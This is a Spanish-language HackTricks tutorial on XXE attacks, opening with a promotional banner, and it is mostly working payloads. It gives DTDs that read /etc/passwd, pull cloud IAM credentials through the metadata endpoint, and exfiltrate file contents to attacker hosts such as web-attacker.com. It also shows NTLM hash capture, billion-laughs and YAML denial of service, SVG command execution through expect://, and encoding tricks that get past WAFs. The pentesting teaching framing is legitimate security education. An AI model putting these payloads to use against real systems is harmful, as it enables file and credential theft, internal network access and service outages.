# XXE - XEE - XML External Entity

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Un ataque de Entidad Externa XML es un tipo de ataque contra una aplicaci칩n que analiza la entrada XML.

## Conceptos b치sicos de XML

**La mayor parte de esto se basa en esta incre칤ble p치gina de Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### Visi칩n general del Lenguaje de Marcado Extensible <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

El Lenguaje de Marcado Extensible, com칰nmente abreviado como XML, se define como un lenguaje de marcado utilizado para el almacenamiento y transporte de datos. Empleando una estructura reminiscente de un 치rbol, compuesto por etiquetas y datos similares a HTML, XML se distingue por no restringirse a etiquetas predefinidas. Esta flexibilidad permite la utilizaci칩n de etiquetas nombradas descriptivamente de acuerdo con los datos que encapsulan. Hist칩ricamente, XML gan칩 prominencia como formato para el transporte de datos, notablemente representado por su contribuci칩n al acr칩nimo "AJAX" (donde "X" significa "XML"). Sin embargo, su popularidad ha disminuido, con JSON emergiendo como el formato preferido.

### Representaci칩n de Elementos de Datos en XML a trav칠s de Entidades <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

En XML, las entidades sirven como mecanismos para representar elementos de datos dentro de un documento, ofreciendo una alternativa a la inserci칩n directa de datos. La especificaci칩n XML incorpora varias entidades integradas. Por ejemplo, `&lt;` y `&gt;` sirven para representar los caracteres `<` y `>`, respectivamente. Dado su papel en delimitar las etiquetas XML, estos metacaracteres a menudo deben representarse utilizando entidades cuando aparecen dentro de los datos.

### Definici칩n de Elementos XML

Las declaraciones de tipo de elemento son cr칤ticas en XML, ya que establecen las pautas para la presencia, tipos y secuenciaci칩n de elementos dentro de un documento XML. Ejemplos ilustrativos incluyen:

- `<!ELEMENT stockCheck ANY>` indica que el elemento `<stockCheck></stockCheck>` puede contener cualquier tipo de objeto.
- `<!ELEMENT stockCheck EMPTY>` dicta que el elemento `<stockCheck></stockCheck>` debe permanecer sin contenido.
- `<!ELEMENT stockCheck (productId,storeId)>` especifica que el elemento `<stockCheck>` solo puede contener `<productId>` y `<storeId>` como elementos secundarios.

### Introducci칩n a la Definici칩n de Tipo de Documento <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

La Definici칩n de Tipo de Documento (DTD) desempe침a un papel fundamental en XML al proporcionar declaraciones que pueden dictar la estructura de un documento XML, los tipos de datos permitidos y m치s. El elemento `DOCTYPE`, que es opcional y se coloca al principio de un documento XML, puede declarar una DTD. Las DTD pueden clasificarse como "internas" cuando est치n completamente integradas en un documento, "externas" cuando se cargan desde una fuente externa, o una combinaci칩n de ambas.

### Utilizaci칩n de Entidades Personalizadas en XML <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XML facilita la definici칩n de entidades personalizadas dentro de una DTD. Una declaraci칩n de ejemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "mi valor de entidad" > ]>`

Tal declaraci칩n indica que la referencia de entidad `&myentity;` dentro del documento se sustituir치 por "mi valor de entidad".

### Incorporaci칩n de Entidades Externas en XML <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

Las entidades externas en XML son un subtipo de entidades personalizadas, caracterizadas por tener sus definiciones externas a la DTD. Estas entidades utilizan la palabra clave `SYSTEM` y requieren una URL que especifique la ubicaci칩n desde la cual se recuperar치 el valor de la entidad, lo que potencialmente permite [ataques de entidad externa XML](https://portswigger.net/web-security/xxe).

### Explotaci칩n de Entidades de Par치metro XML para la Detecci칩n de XXE

En escenarios donde las entidades est치ndar son ineficaces para explotar vulnerabilidades de XXE debido a la validaci칩n o al endurecimiento del analizador XML, pueden emplearse entidades de par치metro XML. Distinguidas por la inclusi칩n de un car치cter de porcentaje precediendo al nombre de la entidad y referenciadas utilizando el mismo car치cter, las entidades de par치metro XML se referencian exclusivamente dentro de la DTD. Pueden facilitar la detecci칩n ciega de XXE a trav칠s de m칠todos fuera de banda, ejemplificados por la iniciaci칩n de una b칰squeda DNS y una solicitud HTTP a un dominio controlado por el atacante, confirmando as칤 el 칠xito de la explotaci칩n.


## Principales ataques

**[La mayor칤a de estos ataques fueron probados utilizando los incre칤bles laboratorios XEE de Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Prueba de Nueva Entidad

En este ataque voy a probar si una simple nueva declaraci칩n de ENTIDAD est치 funcionando
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Leer archivo

Intentemos leer `/etc/passwd` de diferentes maneras. Para Windows, podr칤as intentar leer: `C:\windows\system32\drivers\etc\hosts`

En este primer caso, ten en cuenta que en SYSTEM "_\*\*file:///\*\*etc/passwd_" tambi칠n funcionar치.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Este segundo caso deber칤a ser 칰til para extraer un archivo si el servidor web est치 utilizando PHP (No es el caso de los laboratorios de Portswiggers)
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
En este tercer caso, notamos que estamos declarando el `Elemento stockCheck` como ANY.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Listado de directorios

En aplicaciones basadas en **Java**, podr칤a ser posible **listar el contenido de un directorio** a trav칠s de XXE con una carga 칰til como (solo pidiendo el directorio en lugar del archivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE podr칤a ser utilizado para abusar de un SSRF dentro de una nube
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF ciego

Usando la **t칠cnica comentada anteriormente** puedes hacer que el servidor acceda a un servidor que controlas para mostrar su vulnerabilidad. Pero, si eso no funciona, tal vez sea porque **las entidades XML no est치n permitidas**, en ese caso podr칤as intentar usar **entidades de par치metros XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Ciego" SSRF - Exfiltrar datos fuera de la banda

**En esta ocasi칩n vamos a hacer que el servidor cargue un nuevo DTD con un payload malicioso que enviar치 el contenido de un archivo a trav칠s de una solicitud HTTP (para archivos de varias l칤neas podr칤as intentar exfiltrarlo a trav칠s de** _**ftp://**_**). Esta explicaci칩n fue tomada de** [**los laboratorios de Portswigger aqu칤**](https://portswigger.net/web-security/xxe/blind)**.**

Un ejemplo de un DTD malicioso para exfiltrar el contenido del archivo `/etc/hostname` es el siguiente:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Este DTD lleva a cabo los siguientes pasos:

* Define una entidad de par치metro XML llamada `file`, que contiene el contenido del archivo `/etc/passwd`.
* Define una entidad de par치metro XML llamada `eval`, que contiene una declaraci칩n din치mica de otra entidad de par치metro XML llamada `exfiltrate`. La entidad `exfiltrate` ser치 evaluada haciendo una solicitud HTTP al servidor web del atacante que contiene el valor de la entidad `file` dentro de la cadena de consulta de la URL.
* Utiliza la entidad `eval`, lo que provoca que se realice la declaraci칩n din치mica de la entidad `exfiltrate`.
* Utiliza la entidad `exfiltrate`, de modo que su valor se eval칰a solicitando la URL especificada.

Luego, el atacante debe alojar el DTD malicioso en un sistema que controla, normalmente carg치ndolo en su propio servidor web. Por ejemplo, el atacante podr칤a servir el DTD malicioso en la siguiente URL:\
`http://web-attacker.com/malicious.dtd`

Finalmente, el atacante debe enviar la siguiente carga 칰til XXE a la aplicaci칩n vulnerable:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload XXE declara una entidad de par치metro XML llamada `xxe` y luego utiliza la entidad dentro del DTD. Esto har치 que el analizador XML obtenga el DTD externo del servidor del atacante e interprete en l칤nea. Los pasos definidos dentro del DTD malicioso se ejecutar치n y el archivo `/etc/passwd` se transmitir치 al servidor del atacante.

### Basado en Errores (DTD Externo)

**En este caso, haremos que el servidor cargue un DTD malicioso que mostrar치 el contenido de un archivo dentro de un mensaje de error (esto solo es v치lido si puedes ver mensajes de error).** [**Ejemplo aqu칤.**](https://portswigger.net/web-security/xxe/blind)

Puedes desencadenar un mensaje de error de an치lisis XML que contenga el contenido del archivo `/etc/passwd` utilizando un DTD externo malicioso de la siguiente manera:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Este DTD lleva a cabo los siguientes pasos:

* Define una entidad de par치metro XML llamada `file`, que contiene el contenido del archivo `/etc/passwd`.
* Define una entidad de par치metro XML llamada `eval`, que contiene una declaraci칩n din치mica de otra entidad de par치metro XML llamada `error`. La entidad `error` ser치 evaluada cargando un archivo inexistente cuyo nombre contiene el valor de la entidad `file`.
* Utiliza la entidad `eval`, lo que provoca que se realice la declaraci칩n din치mica de la entidad `error`.
* Utiliza la entidad `error`, de modo que su valor se eval칰a intentando cargar el archivo inexistente, lo que resulta en un mensaje de error que contiene el nombre del archivo inexistente, que es el contenido del archivo `/etc/passwd`.

Invoca el error de DTD externo con:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Y deber칤as ver el contenido del archivo dentro del mensaje de error de la respuesta del servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Por favor, ten en cuenta que la DTD externa nos permite incluir una entidad dentro de la segunda (****`eval`****), pero est치 prohibido en la DTD interna. Por lo tanto, no puedes forzar un error sin usar una DTD externa (generalmente).**_

### **Basado en Errores (DTD del sistema)**

Entonces, 쯤u칠 pasa con las vulnerabilidades ciegas de XXE cuando las **interacciones fuera de banda est치n bloqueadas** (las conexiones externas no est치n disponibles)?.

Una laguna en la especificaci칩n del lenguaje XML puede **exponer datos sensibles a trav칠s de mensajes de error cuando la DTD de un documento combina declaraciones internas y externas**. Este problema permite la redefinici칩n interna de entidades declaradas externamente, facilitando la ejecuci칩n de ataques XXE basados en errores. Tales ataques explotan la redefinici칩n de una entidad de par치metro XML, originalmente declarada en una DTD externa, desde dentro de una DTD interna. Cuando las conexiones fuera de banda est치n bloqueadas por el servidor, los atacantes deben depender de archivos DTD locales para llevar a cabo el ataque, con el objetivo de inducir un error de an치lisis para revelar informaci칩n sensible.


Considera un escenario donde el sistema de archivos del servidor contiene un archivo DTD en `/usr/local/app/schema.dtd`, definiendo una entidad llamada `custom_entity`. Un atacante puede inducir un error de an치lisis XML revelando el contenido del archivo `/etc/passwd` al enviar una DTD h칤brida de la siguiente manera:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Los pasos delineados son ejecutados por esta DTD:

- La definici칩n de una entidad de par치metro XML llamada `local_dtd` incluye el archivo DTD externo ubicado en el sistema de archivos del servidor.
- Ocurre una redefinici칩n para la entidad de par치metro XML `custom_entity`, originalmente definida en el DTD externo, para encapsular un [exploit XXE basado en errores](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Esta redefinici칩n est치 dise침ada para provocar un error de an치lisis, exponiendo el contenido del archivo `/etc/passwd`.
- Al emplear la entidad `local_dtd`, se activa el DTD externo, abarcando la entidad `custom_entity` reci칠n definida. Esta secuencia de acciones precipita la emisi칩n del mensaje de error apuntado por el exploit.


**Ejemplo del mundo real:** Los sistemas que utilizan el entorno de escritorio GNOME a menudo tienen un DTD en `/usr/share/yelp/dtd/docbookx.dtd` que contiene una entidad llamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Dado que esta t칠cnica utiliza un **DTD interno, primero necesitas encontrar uno v치lido**. Puedes hacer esto **instalando** el mismo **SO / Software** que est치 utilizando el servidor y **buscando algunos DTD predeterminados**, o **obteniendo una lista** de **DTD predeterminados** dentro de los sistemas y **verificando** si alguno de ellos existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Para obtener m치s informaci칩n, consulta [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Encontrar DTDs dentro del sistema

En el siguiente repositorio de GitHub incre칤ble, puedes encontrar **rutas de DTDs que pueden estar presentes en el sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Adem치s, si tienes la **imagen Docker del sistema v칤ctima**, puedes utilizar la herramienta del mismo repositorio para **escanear** la **imagen** y **encontrar** la ruta de los **DTDs** presentes dentro del sistema. Lee el [Readme del repositorio de GitHub](https://github.com/GoSecure/dtd-finder) para aprender c칩mo.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE a trav칠s de Analizadores de Office Open XML

Para obtener una explicaci칩n m치s detallada de este ataque, **consulte la segunda secci칩n de [esta incre칤ble publicaci칩n](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) de Detectify**.

La capacidad de **cargar documentos de Microsoft Office es ofrecida por muchas aplicaciones web**, las cuales luego proceden a extraer ciertos detalles de estos documentos. Por ejemplo, una aplicaci칩n web puede permitir a los usuarios importar datos mediante la carga de una hoja de c치lculo en formato XLSX. Para que el analizador extraiga los datos de la hoja de c치lculo, inevitablemente necesitar치 analizar al menos un archivo XML.

Para probar esta vulnerabilidad, es necesario crear un **archivo de Microsoft Office que contenga un payload XXE**. El primer paso es crear un directorio vac칤o en el cual se pueda descomprimir el documento.

Una vez que el documento ha sido descomprimido, el archivo XML ubicado en `./unzipped/word/document.xml` debe ser abierto y editado en un editor de texto preferido (como vim). El XML debe ser modificado para incluir el payload XXE deseado, a menudo comenzando con una solicitud HTTP.

Las l칤neas XML modificadas deben ser insertadas entre los dos objetos XML ra칤z. Es importante reemplazar la URL con una URL monitoreable para las solicitudes.

Finalmente, el archivo puede ser comprimido para crear el archivo malicioso poc.docx. Desde el directorio "unzipped" previamente creado, se debe ejecutar el siguiente comando:

Ahora, el archivo creado puede ser cargado en la aplicaci칩n web potencialmente vulnerable, y se puede esperar que aparezca una solicitud en los registros de Burp Collaborator.


### Protocolo Jar

El protocolo `jar` solo est치 disponible en **aplicaciones Java**. Permite acceder a archivos dentro de un archivo **PKZIP** (`.zip`, `.jar`, ...) y funciona para archivos locales y remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Para poder acceder a archivos dentro de archivos PKZIP es **s칰per 칰til para abusar de XXE a trav칠s de archivos DTD del sistema.** Consulta [esta secci칩n para aprender c칩mo abusar de archivos DTD del sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Detr치s de escena

1. Realiza una solicitud HTTP para cargar el archivo zip. `https://download.host.com/myarchive.zip`
2. Guarda la respuesta HTTP en una ubicaci칩n temporal. `/tmp/...`
3. Extrae el archivo.
4. Lee el `file.zip`
5. Elimina los archivos temporales.

Ten en cuenta que es posible detener el flujo en el segundo paso. El truco es nunca cerrar la conexi칩n al servir el archivo. [Estas herramientas pueden ser 칰tiles](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): una en python `slow_http_server.py` y otra en java `slowserver.jar`.

Una vez que el servidor haya descargado tu archivo, necesitas encontrar su ubicaci칩n navegando por el directorio temporal. Al ser aleatoria, la ruta del archivo no se puede predecir de antemano.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escribir archivos en un directorio temporal puede ayudar a **escalar otra vulnerabilidad que involucre una traves칤a de directorio** (como inclusi칩n de archivos locales, inyecci칩n de plantillas, XSLT RCE, deserializaci칩n, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque de Mil Millones de Risas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explosi칩n Cuadr치tica

![](<../.gitbook/assets/image (531).png>)

#### Obteniendo NTML

En hosts de Windows es posible obtener el hash NTML del usuario del servidor web configurando un controlador responder.py:
```
Responder.py -I eth0 -v
```
y enviando la siguiente solicitud
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Superficies XXE Ocultas

### XInclude

En algunos escenarios, **los datos enviados por el cliente se incorporan en un documento XML mediante procesos en el lado del servidor antes de su an치lisis**. Esto suele ocurrir cuando los datos del cliente se integran en una **solicitud SOAP del backend**, que posteriormente es manejada por un servicio SOAP en el backend.

Realizar un ataque XXE tradicional resulta desafiante en estos casos debido al control limitado sobre la totalidad del documento XML, espec칤ficamente la incapacidad de modificar o introducir un elemento `DOCTYPE`. Sin embargo, aprovechar `XInclude`, una caracter칤stica del est치ndar XML que permite ensamblar un documento XML a partir de subdocumentos m치s peque침os, presenta una soluci칩n alternativa. Este enfoque permite un ataque `XInclude` dentro de cualquier elemento de datos de un documento XML, haci칠ndolo factible en casos donde el control se restringe a una pieza individual de datos incrustada en un documento XML generado por el servidor.

Para iniciar un ataque `XInclude`, se requiere la inclusi칩n del espacio de nombres `XInclude`, junto con la especificaci칩n de la ruta de archivo destinada para la inclusi칩n. El siguiente ejemplo demuestra c칩mo podr칤a estructurarse dicho ataque:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Consulta [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para m치s informaci칩n!

### SVG - Carga de Archivos

Los archivos subidos por usuarios a ciertas aplicaciones, que luego son procesados en el servidor, pueden explotar vulnerabilidades en c칩mo se manejan los formatos de archivo XML o que contienen XML. Formatos comunes de archivos como documentos de oficina (DOCX) e im치genes (SVG) est치n basados en XML.

Cuando los usuarios **suben im치genes**, estas im치genes son procesadas o validadas en el servidor. Incluso para aplicaciones que esperan formatos como PNG o JPEG, **la biblioteca de procesamiento de im치genes del servidor tambi칠n podr칤a admitir im치genes SVG**. SVG, al ser un formato basado en XML, puede ser explotado por atacantes para enviar im치genes SVG maliciosas, exponiendo as칤 al servidor a vulnerabilidades de XXE (Entidad Externa XML).

A continuaci칩n se muestra un ejemplo de tal exploit, donde una imagen SVG maliciosa intenta leer archivos del sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Otro m칠todo implica intentar **ejecutar comandos** a trav칠s del envoltorio "expect" de PHP:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
En ambos casos, se utiliza el formato SVG para lanzar ataques que explotan las capacidades de procesamiento XML del software del servidor, resaltando la necesidad de una s칩lida validaci칩n de entrada y medidas de seguridad.

춰Consulta [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para obtener m치s informaci칩n!

**Ten en cuenta que la primera l칤nea del archivo le칤do o del resultado de la ejecuci칩n aparecer치 DENTRO de la imagen creada. Por lo tanto, debes poder acceder a la imagen que SVG ha creado.**

### **PDF - Subida de archivos**

Lee el siguiente post para **aprender c칩mo explotar un XXE subiendo un archivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded a XML

Si una solicitud POST acepta los datos en formato XML, podr칤as intentar explotar un XXE en esa solicitud. Por ejemplo, si una solicitud normal contiene lo siguiente:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Entonces podr칤as enviar la siguiente solicitud, con el mismo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON a XEE

Para cambiar la solicitud, podr칤as usar una Extensi칩n de Burp llamada "**Content Type Converter**". [Aqu칤](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) puedes encontrar este ejemplo:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Otro ejemplo se puede encontrar [aqu칤](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass de WAF y Protecciones

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Esto solo funciona si el servidor XML acepta el protocolo `data://`.

### UTF-7

Puedes usar la \[**"Receta de codificaci칩n**" de CyberChef aqu칤](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4) para transformar a UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass de Protocolo de Archivo

Si la web est치 utilizando PHP, en lugar de usar `file:/` puedes usar **envolturas de PHP** `php://filter/convert.base64-encode/resource=` para **acceder a archivos internos**.

Si la web est치 utilizando Java, puedes verificar el [**protocolo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truco de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Puedes crear una **entidad dentro de una entidad** codific치ndola con **entidades HTML** y luego llamarla para **cargar un dtd**.\
Ten en cuenta que las **Entidades HTML** utilizadas deben ser **num칠ricas** (como \[en este ejemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Ejemplo DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Envolturas PHP

### Base64

**Extraer** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
